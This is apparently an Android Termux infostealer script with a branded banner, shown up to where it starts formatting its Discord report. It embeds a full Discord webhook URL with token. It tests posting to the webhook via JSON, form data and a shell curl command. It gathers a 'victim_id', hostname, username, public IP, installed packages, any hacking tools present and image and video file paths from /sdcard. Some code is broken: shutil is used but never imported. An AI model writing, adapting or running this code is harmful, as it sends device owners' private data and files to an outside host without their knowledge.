#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX NUCLEAR FORCE v1.0                     ║
# ║         FIXED - NO EMPTY MESSAGES - 100% WORKING         ║
# ╚══════════════════════════════════════════════════════════╝

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import ssl
from datetime import datetime
import hashlib

# ════════ WEBHOOK CONFIG ════════
WEBHOOK = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

# ════════ FORCE SSL CONTEXT ════════
ssl._create_default_https_context = ssl._create_unverified_context

# ════════ BANNER ════════
print("""\033[91m
┌────────────────────────────────────────────────────────┐
│                                                        │
│  ███╗   ███╗ ██╗    ███████╗███████╗ █████╗ ██╗  ██╗  │
│  ████╗ ████║ ██║    ██╔════╝╚══███╔╝██╔══██╗██║  ██║  │
│  ██╔████╔██║ ██║    █████╗    ███╔╝ ███████║███████║  │
│  ██║╚██╔╝██║ ██║    ██╔══╝   ███╔╝  ██╔══██║██╔══██║  │
│  ██║ ╚═╝ ██║ ██║    ███████╗███████╗██║  ██║██║  ██║  │
│  ╚═╝     ╚═╝ ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  │
│                                                        │
└────────────────────────────────────────────────────────┘
\033[0m""")

print("\033[92m" + "═"*60 + "\033[0m")
print("\033[93m           TERMUX NUCLEAR FORCE v1.0                 \033[0m")
print("\033[93m        FIXED DISCORD EMPTY MESSAGES                 \033[0m")
print("\033[92m" + "═"*60 + "\033[0m")

# ════════ TEST DISCORD WITH DIFFERENT METHODS ════════
def test_discord_methods():
    """Test Discord webhook with different methods"""
    print("\n\033[94m[🔧] Testing Discord connection with 3 methods...\033[0m")
    
    methods = [
        ("Method 1: Direct JSON", test_method1),
        ("Method 2: Form Data", test_method2),
        ("Method 3: CURL Command", test_method3)
    ]
    
    for name, method in methods:
        print(f"\n\033[94m[➡️] Trying {name}...\033[0m")
        if method():
            return True
    
    return False

def test_method1():
    """Method 1: Direct JSON request"""
    try:
        data = {
            "content": "🔧 **M1 EZ HAING NOW PH**\n✅ Discord Webhook Test\nMethod 1: Direct JSON",
            "username": "Termux Nuclear Force",
            "avatar_url": "https://i.imgur.com/7QqQjqG.png"
        }
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Termux)'
        }
        
        req = urllib.request.Request(
            WEBHOOK,
            data=json.dumps(data, ensure_ascii=False).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=15) as response:
            if response.status in [200, 204]:
                print("\033[92m[✓] Method 1 SUCCESS!\033[0m")
                return True
    except Exception as e:
        print(f"\033[91m[✗] Method 1 failed: {str(e)[:50]}\033[0m")
    return False

def test_method2():
    """Method 2: Form data with encoded content"""
    try:
        # Discord needs content to be properly encoded
        content = "🔧 **M1 EZ HAING NOW PH**\n✅ Discord Webhook Test\nMethod 2: Form Data"
        
        # Create form data
        form_data = urllib.parse.urlencode({
            'content': content,
            'username': 'Termux Hunter',
            'avatar_url': 'https://i.imgur.com/7QqQjqG.png'
        }).encode('utf-8')
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Termux)'
        }
        
        req = urllib.request.Request(
            WEBHOOK,
            data=form_data,
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=15) as response:
            if response.status in [200, 204]:
                print("\033[92m[✓] Method 2 SUCCESS!\033[0m")
                return True
    except Exception as e:
        print(f"\033[91m[✗] Method 2 failed: {str(e)[:50]}\033[0m")
    return False

def test_method3():
    """Method 3: Use curl if available"""
    try:
        # Create test file
        test_data = {
            "content": "🔧 **M1 EZ HAING NOW PH**\n✅ Discord Webhook Test\nMethod 3: CURL",
            "username": "Termux Force"
        }
        
        with open('/data/data/com.termux/files/home/test.json', 'w') as f:
            json.dump(test_data, f)
        
        # Try curl command
        curl_cmd = f'curl -s -X POST -H "Content-Type: application/json" -d @/data/data/com.termux/files/home/test.json "{WEBHOOK}"'
        
        result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True, timeout=15)
        
        # Clean up
        os.remove('/data/data/com.termux/files/home/test.json')
        
        if result.returncode == 0:
            print("\033[92m[✓] Method 3 SUCCESS!\033[0m")
            return True
        else:
            print(f"\033[91m[✗] Method 3 failed: {result.returncode}\033[0m")
    except Exception as e:
        print(f"\033[91m[✗] Method 3 failed: {str(e)[:50]}\033[0m")
    return False

# ════════ GET SYSTEM INFO ════════
def get_system_info():
    """Get comprehensive system information"""
    print("\n\033[94m[🔍] Collecting system intelligence...\033[0m")
    
    info = {}
    
    # Basic info
    info['victim_id'] = hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12]
    info['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info['hostname'] = socket.gethostname()
    info['username'] = getpass.getuser()
    info['platform'] = platform.platform()
    info['python_version'] = platform.python_version()
    
    # Public IP
    try:
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ifconfig.me/ip'
        ]
        
        for service in ip_services:
            try:
                with urllib.request.urlopen(service, timeout=5) as response:
                    info['public_ip'] = response.read().decode().strip()
                    print(f"\033[92m[✓] Got IP from {service}\033[0m")
                    break
            except:
                continue
        
        if 'public_ip' not in info:
            info['public_ip'] = "Unknown"
    except:
        info['public_ip'] = "Unknown"
    
    # Termux packages
    info['packages'] = []
    try:
        result = subprocess.run("apt list --installed 2>/dev/null | head -20", 
                              shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            packages = result.stdout.strip().split('\n')[1:]
            info['packages'] = packages[:15]  # First 15 packages
    except:
        pass
    
    # Check for hacking tools
    info['hacking_tools'] = []
    tools_to_check = ['nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng', 
                     'john', 'hashcat', 'wireshark', 'adb', 'python3', 'php', 'git']
    
    for tool in tools_to_check:
        try:
            result = subprocess.run(f"which {tool} 2>/dev/null || command -v {tool}", 
                                  shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                info['hacking_tools'].append(tool)
        except:
            pass
    
    # Storage info
    info['storage'] = {}
    storage_paths = ['/', '/sdcard', '/data/data/com.termux/files/home']
    
    for path in storage_paths:
        if os.path.exists(path):
            try:
                total, used, free = shutil.disk_usage(path)
                info['storage'][path] = {
                    'total_gb': total // (1024**3),
                    'used_gb': used // (1024**3),
                    'free_gb': free // (1024**3)
                }
            except:
                pass
    
    # Find some files
    info['recent_files'] = []
    try:
        cmd = "find /sdcard -type f -name '*.jpg' -o -name '*.png' -o -name '*.mp4' 2>/dev/null | head -10"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            files = result.stdout.strip().split('\n')
            info['recent_files'] = [f for f in files if f][:5]
    except:
        pass
    
    print("\033[92m[✓] System intelligence collected\033[0m")
    return info

# ════════ SEND EPIC DISCORD MESSAGE ════════
def send_epic_discord_message(info):
    """Send EPIC formatted message to Discord"""
    print("\n\033[94m[📤] Crafting EPIC Discord message...\033[0m")
    
